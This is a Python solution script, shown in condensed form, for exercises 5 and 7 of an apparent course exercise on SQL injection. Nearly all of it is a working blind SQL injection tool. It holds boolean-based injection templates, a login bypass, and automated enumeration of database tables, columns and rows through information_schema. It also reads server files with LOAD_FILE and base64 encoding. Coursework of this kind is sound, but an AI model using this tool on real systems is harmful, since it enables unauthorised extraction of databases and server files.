"""Solve questions 5 and 7 of the Safe Programming SQL injection exercise."""
...
class BlindSQLiExerciseSolver:
    ...
    class SQLInjections:
        ...
        GET_VALUE_LENGTH = (
            ...
            "from {from_table} "
            "where {where_condition} "
            "LIMIT {row_index}, 1)){comparator}{length} -- "
        )  # search for length of field in table
        ...
        GET_VALUE_CHAR = (
            ...
            "LIMIT {row_index}, 1), "
            "{character_index}, 1)"
            "){comparator}{compare_ascii} -- "
        )  # search for character of field in table
        ...
        GET_FILE_SIZE = (
            ...
            ")){comparator}{size} -- "
        )  # search for size of file in sql-server filesystem

        GET_FILE_BASE64_CHAR = (
            "?user={username}' "
            "and "
            "ascii("
            "mid("
            "(select TO_BASE64(LOAD_FILE('{filename}'))), "
            "{byte_index}, 1)"
            "){comparator}{compare_num} -- "
        )  # search for character in base64 encoding of file
    ...
    def login(self, user_name: str):
        ...
        injected_user = self.SQLInjections.LOGIN_USER_INJECTION.format(user_name=user_name)
        encoded_user = parse.quote_plus(injected_user, safe="=")
        login_data = f"uid={encoded_user}&password="
    ...
    def __is_query_true(self, sql_injection: str) -> bool:
        ...
        full_query_url = (
            f"http://{self.WEB_SERVER_HOSTNAME}:{self.WEB_SERVER_PORT}"
            f"{self.injection_url}{quoted_sql_injection}"
        )
        query_request = request.Request(
            full_query_url, headers={"Cookie": f"PHPSESSID={self._session_id}"}
        )
    ...
    def __query_search(
        self,
        query_creator: Callable[[str, int], str],
        ...
        :param upper_bound: initial upper bound; when omitted, search for one
    ...
    def __find_value_len(
        self, column_name: str, from_table: str, where_condition: str, row_index: int
    ) -> int:
        """
    ...
    def __find_value_char(
        ...
        def fill_query(comparator: str, compare_ascii: int) -> str:
            return self.SQLInjections.GET_VALUE_CHAR.format(
                username=self._logged_user,
                column_name=column_name,
                from_table=from_table,
                where_condition=where_condition,
    ...
    def __find_file_size(self, filename: str) -> int:
        ...
        def fill_query(comparator: str, size: int) -> str:
            return self.SQLInjections.GET_FILE_SIZE.format(
                username=self._logged_user, filename=filename, comparator=comparator, size=str(size)
            )
    ...
    def __find_file_base64_char(self, filename: str, byte_index: int) -> str:
        ...
        def fill_query(comparator: str, compare_num: int) -> str:
            return self.SQLInjections.GET_FILE_BASE64_CHAR.format(
                username=self._logged_user,
                filename=filename,
    ...
    def __find_value(
        ...
        for char_index in range(value_len):
            value += self.__find_value_char(
                column_name, from_table, where_condition, row_index, char_index
            )
        return value
    ...
    def get_database_table_names(self, database_name: str) -> list[str]:
        ...
        """
        database_table_cnt = self.__find_row_cnt(
    ...
    def get_table_column_names(self, database_name: str, table_name: str) -> list[str]:
        ...
        """
        columns_cnt = self.__find_row_cnt(
            from_table="information_schema.columns",
            where_condition=f"table_schema='{database_name}' and table_name='{table_name}'",
        )
        column_names = []
        for column_index in range(columns_cnt):
            column_name = self.__find_value(
                column_name="column_name",
                from_table="information_schema.columns",
                where_condition=f"table_schema='{database_name}' and table_name='{table_name}'",
    ...
    def get_table_values(
        self, database_name: str, table_name: str, columns: list[str]
    ) -> list[tuple[str, ...]]:
        """
        ...
        """
        rows_count = self.__find_row_cnt(
            from_table=f"{database_name}.{table_name}", where_condition="1=1"
        )
        table_values: list[tuple[str, ...]] = []
        for row_index in range(rows_count):
            table_row = []
            for column in columns:
                value = self.__find_value(
                    column_name=column,
...
def solve_exercise5():
    ...
    for table_name in table_names:
        column_names = sqli_solver.get_table_column_names(
            database_name="secure", table_name=table_name
        )
        print(f"The column names in {table_name} are {column_names}")
        table_values = sqli_solver.get_table_values(
            database_name="secure", table_name=table_name, columns=column_names
        )
